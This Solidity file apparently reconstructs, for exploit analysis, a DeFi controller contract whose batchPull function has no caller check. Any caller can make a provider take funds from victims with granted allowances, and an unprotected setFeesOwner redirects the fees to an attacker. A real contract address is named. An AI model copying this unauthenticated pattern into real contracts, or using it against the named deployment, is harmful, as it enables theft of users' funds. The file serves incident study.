// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title CompoundController - VULNERABLE Implementation
 * @dev Recovered from exploit analysis - this is the malicious/buggy implementation
 *      that was active in the controller proxy during the exploit
 *
 * REAL CONTRACT: 0x769a9fa1e2414db14b35c46e4095d6e8f1694565
 *
 * VULNERABILITY: The batch function has NO caller authorization.
 * Any EOA can call it with arbitrary:
 *   - target (provider address)
 *   - fromAccounts[] (victims with pre-granted allowances)
 *   - amounts[] (amounts to pull from each victim)
 *
 * The function calls the target from the trusted controller address,
 * bypassing the provider's authorization guard.
 */

interface IProvider {
    function _takeUnderlying(address from_, uint256 amount_) external;
    function transferFees() external;
}

contract CompoundController {
    // These would be set by proxy storage layout
    // In the exploit, these pointed to attacker-controlled values
    address public dao;
    address public feesOwner;

    event BatchExecuted(address indexed target, uint256 count);

    /**
     * @dev VULNERABLE FUNCTION - No caller authorization
     *
     * Selector: 0xe321fa05 (recovered)
     *
     * Allows ANY caller to:
     * 1. Specify any target contract (provider)
     * 2. Supply arbitrary victim accounts and amounts
     * 3. Have the target call _takeUnderlying from THE CONTROLLER ADDRESS
     * 4. Call transferFees() which sends funds to attacker-controlled feesOwner
     */
    function batchPull(
        address target,
        address[] calldata fromAccounts,
        uint256[] calldata amounts
    ) external {
        // Only validates array lengths, NO caller check
        require(fromAccounts.length == amounts.length, "Arrays mismatch");

        // Call _takeUnderlying for each victim
        for (uint256 i = 0; i < fromAccounts.length; i++) {
            if (amounts[i] == 0) continue;

            // This call goes to the provider FROM the controller address
            // The provider's onlySmartYieldOrController check PASSES
            IProvider(target)._takeUnderlying(fromAccounts[i], amounts[i]);
        }

        // Trigger fee transfer to attacker-controlled feesOwner
        IProvider(target).transferFees();

        emit BatchExecuted(target, fromAccounts.length);
    }

    /**
     * @dev Set feesOwner - only for testing/setup
     */
    function setFeesOwner(address owner_) external {
        feesOwner = owner_;
    }
}
